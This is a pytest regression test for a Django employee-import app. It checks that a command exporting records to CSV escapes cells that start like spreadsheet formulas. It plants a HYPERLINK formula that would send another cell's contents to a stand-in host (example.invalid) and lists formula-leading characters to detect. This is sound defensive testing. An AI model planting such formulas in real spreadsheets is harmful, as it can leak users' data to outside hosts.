"""Guard since step 11 (D73): the generated CSV escapes text through escape_cell.

imports_make_import_file_csv_formula_injection

Claim: text a spreadsheet author puts in an import's free-text columns (here `full_name` and
`designation`) is approved into Employee unchanged, and `make_import_file` then writes it into a
.csv exactly as stored, so a cell of the operator's file starts like a spreadsheet formula. The
command's .xlsx branch types every string as text and the API exports prefix a single quote
(SPEC F6); the .csv branch does neither.

A failure of the final assertion (XFAIL under the marker) means the weakness is present: a text
cell the command wrote starts with `=`, `+`, `-`, `@`, tab or carriage return. A pass means the
command escaped, refused or left out such text. A `pytest.fail` precondition means the import
did not store the text as given, so the chain does not hold.
"""

import csv
from io import StringIO

import pytest
from django.core.management import CommandError, call_command

from apps.employees.models import Employee
from tests.imports.sheets import new_row, upload_of

pytestmark = pytest.mark.django_db

IMPORTS = "/api/v1/imports/"
FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")
TEXT_COLUMNS = (
    "legacy_code",
    "full_name",
    "email",
    "department",
    "designation",
    "country_code",
    "gender",
)
# Dummy payloads: a link to a reserved, unresolvable domain, and a harmless sum. The parser trims
# surrounding whitespace, so a leading tab or carriage return never reaches the live table.
NAME = '=HYPERLINK("https://example.invalid/?leak="&C2,"Open")'
TITLE = "@SUM(1+1)"


def test_make_import_file_csv_never_starts_a_cell_like_a_formula(api, lookups, tmp_path):
    # The spreadsheet author's row, staged and approved through the API as the HR Manager.
    row = new_row(full_name=NAME, designation=TITLE)
    staged = api.post(IMPORTS, {"file": upload_of(row)}, format="multipart")
    if staged.status_code != 201:
        pytest.fail(f"precondition: upload answered {staged.status_code}: {staged.content!r}")
    body = staged.json()
    if body["error_rows"] != 0 or body["valid_rows"] + body["warning_rows"] != 1:
        pytest.fail(f"precondition: the row was not accepted at staging: {body!r}")
    approved = api.post(f"{IMPORTS}{body['id']}/approve/")
    if approved.status_code != 200 or approved.json()["created_rows"] != 1:
        pytest.fail(f"precondition: approve answered {approved.status_code}: {approved.content!r}")
    stored = Employee.objects.filter(legacy_code=row["legacy_code"]).first()
    if stored is None or (stored.full_name, stored.designation) != (NAME, TITLE):
        pytest.fail(f"precondition: the live table does not hold the sheet's text: {stored!r}")

    # The operator's command, writing every legacy-system employee to a .csv.
    path = tmp_path / "import.csv"
    try:
        call_command("make_import_file", out=str(path), all=True, stdout=StringIO())
    except CommandError:
        return  # refusing to write such a value is secure as well

    with path.open(encoding="utf-8", newline="") as handle:
        lines = list(csv.reader(handle))
    if not lines or not set(TEXT_COLUMNS) <= set(lines[0]):
        pytest.fail(f"precondition: the file has no template header: {lines[:1]!r}")
    header, written = lines[0], lines[1:]

    formula_cells = [
        (column, cell)
        for cells in written
        for column, cell in zip(header, cells, strict=True)
        if column in TEXT_COLUMNS and cell.startswith(FORMULA_STARTS)
    ]
    assert formula_cells == [], formula_cells
